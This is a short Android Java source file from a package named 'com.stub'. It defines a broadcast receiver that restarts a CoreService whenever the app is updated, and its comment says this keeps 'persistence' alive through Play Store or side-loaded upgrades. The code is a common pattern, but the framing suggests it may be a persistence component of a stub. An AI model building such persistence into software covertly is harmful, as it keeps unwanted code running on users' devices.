package com.stub;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

/**
 * Update Receiver — Restarts the core service after the app is updated.
 * This ensures persistence survives Play Store updates or side-loaded APK upgrades.
 */
public class UpdateReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if ("android.intent.action.MY_PACKAGE_REPLACED".equals(intent.getAction())) {

            Intent serviceIntent = new Intent(context, CoreService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        }
    }
}
